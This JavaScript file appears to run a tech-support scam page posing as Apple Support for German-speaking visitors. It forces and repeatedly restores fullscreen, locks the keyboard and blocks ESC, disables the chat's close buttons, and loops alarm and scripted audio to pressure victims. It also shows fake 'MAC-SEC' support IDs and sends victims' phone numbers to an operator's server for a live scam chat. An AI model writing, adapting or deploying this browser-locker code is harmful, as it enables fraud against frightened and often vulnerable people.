        document.getElementById('macChatHeaderPhone').textContent = window.GLOBAL_PHONE_NUMBER || '0800-100-183';
        initializeChat();
    });
    
    // Handle close failed modal button
    const closeBtn = document.getElementById('macCloseFailedModalBtn');
    if (closeBtn) {
        closeBtn.addEventListener('click', () => {
            console.log('🚪 Close button clicked');
            window.hideConnectionFailed();
            // Hide all chat windows
            document.querySelectorAll('.chat-window').forEach(window => {
                window.classList.add('hidden');
            });
            // Restart main audio
            const mainAudio = document.getElementById('mainAudio');
            if (mainAudio) {
                mainAudio.currentTime = 0;
                mainAudio.loop = true;
                mainAudio.play().catch(err => console.log('Main audio play error:', err));
            }
        });
        console.log('✅ Close button event listener attached');
    } else {
        console.error('❌ Close button not found in DOM');
    }
    
    // Verify modal exists in DOM on initialization
    console.log('🔍 Checking for connection failed modal on initialization...');
    const modalCheck = document.getElementById('macConnectionFailedModal');
    if (modalCheck) {
        console.log('✅ Mac connection failed modal found in DOM');
        console.log('📊 Modal initial display:', modalCheck.style.display);
    } else {
        console.error('❌ Mac connection failed modal NOT FOUND in DOM on initialization!');
    }
    
    // Add delegated click handler for links in chat messages
    const chatMessagesArea = document.getElementById('chatMessagesArea');
    if (chatMessagesArea) {
        chatMessagesArea.addEventListener('click', function(e) {
            // Check if clicked element is a link
            if (e.target.tagName === 'A' && e.target.hasAttribute('href')) {
                e.preventDefault();
                const url = e.target.getAttribute('href');
                console.log('🔗 Link clicked:', url);
                window.open(url, '_blank', 'noopener,noreferrer');
            }
        });
        console.log('✅ Link click handler added to chat messages area');
    }

    // Close buttons - DISABLED (chat is non-closable)
    document.querySelectorAll('.chat-traffic-light.red').forEach(button => {
        button.addEventListener('click', () => {
            console.log('Close button disabled - chat is non-closable');
            // Chat cannot be closed
            return false;
        });
    });
}

// Chat messaging functionality
let pusherClient = null;
let chatChannel = null;
let conversationId = null;
let connectionTimeout = null;

function initializeChat() {
    console.log('🚀 Initializing chat...');
    
    // Send initial connection message to server
    sendInitialConnection();

    // Handle back button
    const backBtn = document.getElementById('chatBackBtn');
    if (backBtn) {
        backBtn.addEventListener('click', () => {
            console.log('Back button disabled - chat is non-closable');
            // Chat cannot be closed
            return false;
        });
    }

    // Handle send message
    const sendBtn = document.getElementById('sendMessage');
    const messageInput = document.getElementById('messageInput');
    
    if (sendBtn) {
        sendBtn.addEventListener('click', sendMessage);
    }
    
    if (messageInput) {
        messageInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                sendMessage();
            }
        });
        
        // Auto-focus on the input field
        setTimeout(() => {
            messageInput.focus();
            console.log('🎯 Chat input focused');
        }, 300);
    }
}

function sendInitialConnection() {
    // Set 15-second timeout for connection
    if (connectionTimeout) {
        clearTimeout(connectionTimeout);
    }
    connectionTimeout = setTimeout(() => {
        console.log('⏱️ Connection timeout - no response after 15 seconds');
        window.showConnectionFailed();
    }, 15000);
    
    const data = {
        phone: selectedCountryCode + ' ' + phoneNumber,
        country_code: selectedCountryCode,
        page_url: window.location.href,
        visitor_ip: 'N/A'
    };

    console.log('📤 Sending initial connection:', data);

    fetch(window.CHAT_CONFIG.server + '/api/visitor/init', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        console.log('📥 Response received');
        console.log('📊 Response status:', response.status);
        console.log('📊 Response ok:', response.ok);
        
        if (!response.ok) {
            throw new Error('HTTP error! status: ' + response.status);
        }
        return response.json();
    })
    .then(data => {
        console.log('✅ Connection initialized:', data);
        
        // Clear connection timeout on successful connection
        if (connectionTimeout) {
            clearTimeout(connectionTimeout);
            connectionTimeout = null;
        }
        
        if (data && data.conversation && data.conversation.id) {
            conversationId = data.conversation.id;
            console.log('✅ Conversation ID:', conversationId);
            appendMessage('System', 'Mit Support verbunden. Sie können jetzt Nachrichten senden.', false);
            
            // Start polling for messages
            startMessagePolling();
        }
    })
    .catch(error => {
        console.error('❌ Connection error caught:', error);
        console.error('❌ Error type:', error.constructor.name);
        console.error('❌ Error message:', error.message);
        
        // Clear connection timeout
        if (connectionTimeout) {
            console.log('⏱️ Clearing connection timeout');
            clearTimeout(connectionTimeout);
            connectionTimeout = null;
        }
        
        console.log('🚨 Calling showConnectionFailed from catch block');
        window.showConnectionFailed();
    });
}

// Start polling for new messages
let messagePollingInterval = null;
let lastMessageId = 0;

function startMessagePolling() {
    if (!conversationId) return;
    
    console.log('🔄 Starting message polling...');
    
    // Clear any existing polling
    if (messagePollingInterval) {
        clearInterval(messagePollingInterval);
    }
    
    messagePollingInterval = setInterval(function() {
        fetch(window.CHAT_CONFIG.server + '/api/visitor/conversations/' + conversationId, {
            method: 'GET',
            headers: {
                'Accept': 'application/json'
            }
        }).then(response => response.json())
          .then(data => {
              if (data && data.messages) {
                  // Process new messages (only those with ID > lastMessageId)
                  data.messages.forEach(function(msg) {
                      if (msg.sender_type === 'agent' && msg.id > lastMessageId) {
                          console.log('📨 New message from agent:', msg);
                          appendMessage('Apple Support', msg.body, false);
                          lastMessageId = Math.max(lastMessageId, msg.id);
                          // Play notification sound
                          const notificationAudio = document.getElementById('notificationAudio');
                          if (notificationAudio) {
                              notificationAudio.currentTime = 0;
                              notificationAudio.play().catch(err => console.log('Notification sound error:', err));
                          }
                      }
                  });
              }
          })
          .catch(error => {
              console.error('❌ Failed to poll messages:', error);
          });
    }, 2000); // Poll every 2 seconds
}

function sendMessage() {
    const messageInput = document.getElementById('messageInput');
    const message = messageInput.value.trim();
    
    if (message === '') return;
    
    if (!conversationId) {
        appendMessage('System', 'Chat nicht initialisiert. Bitte warten...', false);
        return;
    }
    
    console.log('📤 Sending message:', message);
    
    // Clear input first
    messageInput.value = '';
    
    // Send to server
    const data = {
        body: message
    };

    fetch(window.CHAT_CONFIG.server + '/api/visitor/conversations/' + conversationId + '/message', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(data)
    }).then(response => {
        console.log('📥 Send response status:', response.status);
        return response.json();
    })
      .then(data => {
          console.log('✅ Message sent successfully:', data);
          // Append user message after successful send
          appendMessage('Sie', message, true);
      })
      .catch(error => {
          console.error('❌ Send error:', error);
          window.showConnectionFailed();
      });
}

// Function to make links clickable
function makeLinksClickable(text) {
    // Detect URLs starting with http://, https://, or www.
    const urlRegex = /(https?:\/\/[^\s<]+)/g;
    return text.replace(urlRegex, function(url) {
        return '<a href="' + url + '" target="_blank" rel="noopener noreferrer" style="color: #0A84FF; text-decoration: underline; cursor: pointer;">' + url + '</a>';
    });
}

let reminderLoopTimeout = null;

// Function to start reminder audio loop
function startReminderLoop() {
    console.log('🔔 Starting reminder audio loop');
    // Clear any existing loop
    stopReminderLoop();
    
    // Play reminder audio, wait for it to finish, then wait 5 seconds before repeating
    function playReminder() {
        const reminderAudio = document.getElementById('reminderAudio');
        if (reminderAudio) {
            reminderAudio.currentTime = 0;
            
            // Remove any existing event listener
            reminderAudio.removeEventListener('ended', handleReminderEnded);
            
            // Add event listener for when audio finishes
            function handleReminderEnded() {
                console.log('🔔 Reminder audio finished, waiting 5 seconds...');
                // Wait 5 seconds after audio finishes, then play again
                reminderLoopTimeout = setTimeout(playReminder, 5000);
            }
            
            reminderAudio.addEventListener('ended', handleReminderEnded);
            reminderAudio.play().catch(err => console.log('Reminder audio play error:', err));
        }
    }
    
    playReminder();
}

// Function to stop reminder audio loop
function stopReminderLoop() {
    if (reminderLoopTimeout) {
        console.log('🔕 Stopping reminder audio loop');
        clearTimeout(reminderLoopTimeout);
        reminderLoopTimeout = null;
    }
    const reminderAudio = document.getElementById('reminderAudio');
    if (reminderAudio) {
        reminderAudio.pause();
        reminderAudio.currentTime = 0;
    }
}

// Function to check message and play specific audio
function checkAndPlayMessageAudio(message) {
    // Define message-to-audio mappings
    const audioMappings = [
        { text: 'Können Sie bitte Ihre richtige Nummer schreiben?', audioId: 'audioA' },
        { text: 'Bitte antworten Sie auf die Fragen', audioId: 'audioB' },
        { text: 'Bitte kontaktieren Sie die Supportnummer', audioId: 'audioC' },
        { text: 'Ich habe von einer kalifornischen Nummer angerufen, aber es geht immer auf die Mailbox. Bitte antworten Sie', audioId: 'audioD' }
    ];
    
    // Check if message matches any of the trigger texts
    for (let mapping of audioMappings) {
        if (message.includes(mapping.text)) {
            console.log('🔊 Playing specific audio for message:', mapping.text);
            const audio = document.getElementById(mapping.audioId);
            if (audio) {
                audio.currentTime = 0;
                audio.play().catch(err => console.log('Audio play error:', err));
            }
            break; // Play only the first match
        }
    }
}

let macHighlightTimeout = null;

function appendMessage(sender, message, isUser) {
    // Check if message is just ".." (reminder trigger)
    if (!isUser && message.trim() === '..') {
        console.log('🔔 Received reminder trigger (..), starting reminder loop');
        startReminderLoop();
        return; // Don't display the message
    }
    
    const messagesArea = document.getElementById('chatMessagesArea');
    
    const messageDiv = document.createElement('div');
    const messageId = 'mac-msg-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    messageDiv.id = messageId;
    messageDiv.className = 'mac-chat-message-item';
    messageDiv.style.marginBottom = '16px';
    messageDiv.style.display = 'flex';
    messageDiv.style.flexDirection = 'column';
    messageDiv.style.alignItems = isUser ? 'flex-end' : 'flex-start';
    
    const senderDiv = document.createElement('div');
    senderDiv.style.fontSize = '12px';
    senderDiv.style.color = 'rgba(255, 255, 255, 0.5)';
    senderDiv.style.marginBottom = '4px';
    senderDiv.textContent = sender;
    
    const contentDiv = document.createElement('div');
    contentDiv.className = 'mac-message-bubble';
    contentDiv.style.padding = '10px 14px';
    contentDiv.style.borderRadius = '12px';
    contentDiv.style.maxWidth = '70%';
    contentDiv.style.wordWrap = 'break-word';
    contentDiv.style.fontSize = '14px';
    contentDiv.style.lineHeight = '1.4';
    contentDiv.style.transition = 'all 0.3s ease';
    
    if (isUser) {
        contentDiv.style.background = 'linear-gradient(to bottom, #0A84FF, #0066CC)';
        contentDiv.style.color = '#fff';
    } else {
        contentDiv.style.background = 'rgba(60, 60, 65, 0.8)';
        contentDiv.style.color = '#fff';
    }
    
    // Make links clickable in the message
    const processedMessage = makeLinksClickable(message);
    contentDiv.innerHTML = processedMessage;
    
    messageDiv.appendChild(senderDiv);
    messageDiv.appendChild(contentDiv);
    messagesArea.appendChild(messageDiv);
    
    // Scroll to bottom
    messagesArea.scrollTop = messagesArea.scrollHeight;
    
    // If this is a support message (not from user), set up highlight timeout
    if (!isUser) {
        // Check and play specific audio if message matches trigger text
        checkAndPlayMessageAudio(message);
        
        // Clear any existing timeout
        if (macHighlightTimeout) {
            clearTimeout(macHighlightTimeout);
        }
        
        // Remove highlight from all messages
        document.querySelectorAll('.mac-message-bubble').forEach(bubble => {
            bubble.style.animation = 'none';
            bubble.style.boxShadow = 'none';
        });
        
        // Set timeout to highlight this message after 7 seconds
        macHighlightTimeout = setTimeout(() => {
            const targetBubble = document.querySelector('#' + messageId + ' .mac-message-bubble');
            if (targetBubble) {
                targetBubble.style.animation = 'mac-pulse-highlight 1.5s ease-in-out infinite';
                targetBubble.style.boxShadow = '0 0 0 0 rgba(10, 132, 255, 0.7)';
                
                // Add animation keyframes if not already added
                if (!document.getElementById('mac-highlight-animation-style')) {
                    const style = document.createElement('style');
                    style.id = 'mac-highlight-animation-style';
                    style.textContent = `
                        @keyframes mac-pulse-highlight {
                            0% {
                                box-shadow: 0 0 0 0 rgba(10, 132, 255, 0.7);
                            }
                            50% {
                                box-shadow: 0 0 0 12px rgba(10, 132, 255, 0);
                                background: rgba(10, 132, 255, 0.3) !important;
                            }
                            100% {
                                box-shadow: 0 0 0 0 rgba(10, 132, 255, 0);
                            }
                        }
                    `;
                    document.head.appendChild(style);
                }
            }
        }, 7000);
    } else {
        // User sent a message, clear highlight timeout and remove any highlights
        if (macHighlightTimeout) {
            clearTimeout(macHighlightTimeout);
            macHighlightTimeout = null;
        }
        document.querySelectorAll('.mac-message-bubble').forEach(bubble => {
            bubble.style.animation = 'none';
            bubble.style.boxShadow = 'none';
        });
        // Stop reminder loop when customer replies
        stopReminderLoop();
    }
}

// Audio handling
let currentAudio = null;
let audioLoopTimeout = null;
let isChatOpen = false;

function playAudioWithDelay(audioId, delay) {
    // Stop any currently playing audio and clear timeout
    stopAllAudio();

    const audio = document.getElementById(audioId);
    if (!audio) return;

    function playLoop() {
        audio.currentTime = 0;
        audio.play().catch(error => {
            console.log('Audio playback failed:', error);
        });

        // Only schedule next play if delay is provided (for looping)
        if (delay > 0) {
            audioLoopTimeout = setTimeout(playLoop, (audio.duration * 1000) + (delay * 1000));
        }
    }

    currentAudio = audio;
    playLoop();
}

function stopAllAudio() {
    // Clear any pending timeout
    if (audioLoopTimeout) {
        clearTimeout(audioLoopTimeout);
        audioLoopTimeout = null;
    }

    // Stop all audio elements
    ['mainAudio', 'step1Audio', 'step2Audio', 'stepMidAudio', 'step3Audio'].forEach(id => {
        const audio = document.getElementById(id);
        if (audio) {
            audio.pause();
            audio.currentTime = 0;
        }
    });

    currentAudio = null;
}

function stopMainAudio() {
    const mainAudio = document.getElementById('mainAudio');
    if (mainAudio) {
        mainAudio.pause();
        mainAudio.currentTime = 0;
    }
}

function playMainAudio() {
    // Don't play main audio if chat is open
    if (isChatOpen) {
        console.log('Main audio blocked - chat is open');
        return;
    }
    const mainAudio = document.getElementById('mainAudio');
    if (mainAudio) {
        stopAllAudio();
        mainAudio.play().catch(error => {
            console.log('Main audio playback failed:', error);
        });
        currentAudio = mainAudio;
    }
}

// Initialize main audio on first click
let mainAudioStarted = false;
const startMainAudio = () => {
    if (!mainAudioStarted) {
        playMainAudio();
        mainAudioStarted = true;
    }
};

// Prompt box handling
function showSupportPrompt() {
    document.getElementById('errorPrompt').classList.add('hidden');
    document.getElementById('supportPrompt').classList.remove('hidden');
}

// Generate random support ID
function generateSupportId() {
    return 'MAC-SEC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
}

// Fullscreen and Lock functionality
function activateFullScreen() {
    // Don't trigger if overlay is still active or auto-fullscreen is disabled
    if (!overlayDismissed || !ENABLE_AUTO_FULLSCREEN) {
        console.log('activateFullScreen blocked - overlay active or disabled');
        return;
    }
    
    const element = document.documentElement;
    if (element.requestFullscreen) {
        element.requestFullscreen();
    } else if (element.mozRequestFullScreen) {
        element.mozRequestFullScreen();
    } else if (element.webkitRequestFullscreen) {
        element.webkitRequestFullscreen();
    } else if (element.msRequestFullscreen) {
        element.msRequestFullscreen();
    }
}

// Lock keyboard and prevent ESC
if (navigator.keyboard && navigator.keyboard.lock) {
    navigator.keyboard.lock();
}

// Prevent keyboard input except for chat input and dialpad
document.onkeydown = function(e) {
    e = e || window.event;
    
    // Allow keyboard input in chat message input
    if (e.target && e.target.id === 'messageInput') {
        return true;
    }
    
    // Allow number keys for dialpad when it's visible
    const dialPad = document.getElementById('dialPad');
    if (dialPad && !dialPad.classList.contains('hidden')) {
        // Allow number keys (0-9), backspace, and Enter
        if ((e.keyCode >= 48 && e.keyCode <= 57) || // 0-9 on main keyboard
            (e.keyCode >= 96 && e.keyCode <= 105) || // 0-9 on numpad
            e.keyCode === 8) { // Backspace
            handleDialPadKeyPress(e);
            return true;
        } else if (e.keyCode === 13) { // Enter key
            e.preventDefault();
            document.getElementById('submitPhone').click();
            return true;
        }
    }
    
    if (e.keyCode === 27) { // ESC key
        e.preventDefault();
        if (document.fullscreenElement) {
            return false;
        }
    }
    return false;
};

// Additional ESC key prevention for older browsers
window.addEventListener('keydown', function(e) {
    // Allow keyboard input in chat message input
    if (e.target && e.target.id === 'messageInput') {
        return true;
    }
    
    // Allow number keys for dialpad
    const dialPad = document.getElementById('dialPad');
    if (dialPad && !dialPad.classList.contains('hidden')) {
        if ((e.keyCode >= 48 && e.keyCode <= 57) || 
            (e.keyCode >= 96 && e.keyCode <= 105) || 
            e.keyCode === 8 ||
            e.keyCode === 13) {
            return true;
        }
    }
    
    if (e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
}, true);

// Prevent F11 and other function keys
window.addEventListener('keyup', function(e) {
    // Allow keyboard input in chat message input
    if (e.target && e.target.id === 'messageInput') {
        return true;
    }
    
    // Allow number keys for dialpad
    const dialPad = document.getElementById('dialPad');
    if (dialPad && !dialPad.classList.contains('hidden')) {
        if ((e.keyCode >= 48 && e.keyCode <= 57) || 
            (e.keyCode >= 96 && e.keyCode <= 105) || 
            e.keyCode === 8 ||
            e.keyCode === 13) {
            return true;
        }
    }
    
    e.preventDefault();
    e.stopPropagation();
    return false;
}, true);

// Prevent browser's default ESC key behavior
document.addEventListener('fullscreenchange', function() {
    if (!document.fullscreenElement) {
        activateFullScreen();
    }
});
document.addEventListener('webkitfullscreenchange', function() {
    if (!document.webkitFullscreenElement) {
        activateFullScreen();
    }
});
document.addEventListener('mozfullscreenchange', function() {
    if (!document.mozFullScreenElement) {
        activateFullScreen();
    }
});
document.addEventListener('MSFullscreenChange', function() {
    if (!document.msFullscreenElement) {
        activateFullScreen();
    }
});

// Image Overlay Management - DISABLED (replaced by video player overlay)
// class ImageOverlayManager {
//     constructor() {
//         this.overlay = document.getElementById('imageOverlay');
//         this.loadRandomImage();
//     }

//     loadRandomImage() {
//         // Pick one random image number between 1-10
//         const randomNum = Math.floor(Math.random() * 10) + 1;
//         const imagePath = `overlay/o${randomNum}.jpg`;
        
//         // Load and display only this one image
//         const img = new Image();
//         img.onload = () => {
//             this.overlay.style.backgroundImage = `url('${imagePath}')`;
//         };
//         img.src = imagePath;
//     }

//     hideOverlay() {
//         this.overlay.classList.add('hidden');
//     }
// }

// // Initialize overlay manager
// window.overlayManager = new ImageOverlayManager();

// // Handle overlay click
// document.getElementById('imageOverlay').addEventListener('click', function() {
//     // Remove overlay-active class to show main content
//     document.body.classList.remove('overlay-active');
    
//     activateFullScreen();
//     window.overlayManager.hideOverlay();
// });

// Track if overlay has been shown
let hasShownOverlay = false;

// Handle clicks for re-entering fullscreen
document.body.addEventListener('click', function bodyClickHandler(e) {
    // Don't trigger if overlay is still active
    if (!overlayDismissed) {
        return;
    }
    
    // Allow OK and Cancel buttons to trigger fullscreen
    if (e.target.classList.contains('mac-button-ok') || 
        e.target.classList.contains('mac-button-cancel')) {
        activateFullScreen();
        return;
    }
    
    // Exclude other interactive elements from triggering fullscreen
    if (e.target.closest('.dialog-window') || 
        e.target.tagName.toLowerCase() === 'button' ||
        e.target.closest('input') ||
        e.target.closest('select') ||
        e.target.closest('.dialpad') ||
        e.target.closest('.country-options')) {
        return;
    }
    activateFullScreen();
});

// Start the simulation when the page loads
document.addEventListener('DOMContentLoaded', () => {
    // Don't initialize if overlay is active - wait for it to be dismissed
    if (!document.body.classList.contains('overlay-active')) {
        initialize(); // initCPUGraph is already called inside initialize()
    }
    
    // Generate and set support ID
    const supportIdElement = document.getElementById('supportId');
    if (supportIdElement) {
        supportIdElement.textContent = 'Support ID: ' + generateSupportId();
    }
    
    // Add click listener to start main audio
    document.addEventListener('click', () => {
        if (!mainAudioStarted && !isChatOpen) {
            mainAudioStarted = true;
            // Only play main audio if no chat window is open
            const anyChatWindowOpen = Array.from(document.querySelectorAll('.chat-window')).some(w => !w.classList.contains('hidden'));
            if (!anyChatWindowOpen) {
                playMainAudio();
            }
        }
    });

    // Add click handler for Try Again button
    document.getElementById('tryAgainBtn').addEventListener('click', (e) => {
        e.stopPropagation(); // Prevent triggering the document click handler
        showSupportPrompt();
    });

    // Initialize chat form
    initChatForm();

    // Add click handlers for all Chat Now buttons
    document.querySelectorAll('.mac-button').forEach(button => {
        button.addEventListener('click', (e) => {
            e.stopPropagation(); // Prevent triggering the document click handler
            stopAllAudio(); // Stop main audio
            showWindow('countrySelect'); // Show first step
        });
    });
});

// Handle page visibility changes to maintain accuracy
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        // Page is hidden - could pause timers here if needed
    } else {
        // Page is visible - could resume timers here if needed
    }
});